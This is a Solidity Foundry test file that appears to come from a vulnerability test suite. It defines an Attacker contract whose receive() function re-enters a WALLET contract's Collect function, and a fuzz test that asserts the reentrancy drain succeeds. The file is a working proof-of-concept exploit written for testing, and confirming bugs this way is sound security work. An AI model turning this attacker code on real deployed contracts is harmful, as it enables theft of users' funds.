
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET, Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {
    WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 2);

        // fund victim and attacker and this test
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // attacker needs at least MinSum in its WALLET balance and unlockTime < now
        // send ether directly to attacker so it can call Put on WALLET
        (bool ok,) = address(_attacker).call{value: attackVal}("");
        require(ok, "fund attacker failed");

        // ensure time so unlock condition can be satisfied
        vm.warp(block.timestamp + 1);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) {
        victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;

        // deposit into WALLET via Put so that attacker has balance >= MinSum
        // unlockTime set to 0 so it is already unlocked after vm.warp in test
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedVal = val;

        // ensure we try to withdraw an amount that passes WALLET's checks
        uint256 withdrawAmount = val;
        if (withdrawAmount < victim.MinSum()) {
            withdrawAmount = victim.MinSum();
        }
        if (withdrawAmount > address(victim).balance) {
            withdrawAmount = address(victim).balance;
        }

        victim.Collect(withdrawAmount);

        // exploit succeeded if we gained more than our starting balance
        if (address(this).balance > initialSnapshot + withdrawAmount) {
            exploitSucceeded = true;
        } else if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;

            uint256 withdrawAmount = storedVal;
            if (withdrawAmount < victim.MinSum()) {
                withdrawAmount = victim.MinSum();
            }
            if (withdrawAmount > address(victim).balance) {
                withdrawAmount = address(victim).balance;
            }

            if (withdrawAmount > 0) {
                victim.Collect(withdrawAmount);
            }
        }
    }
}
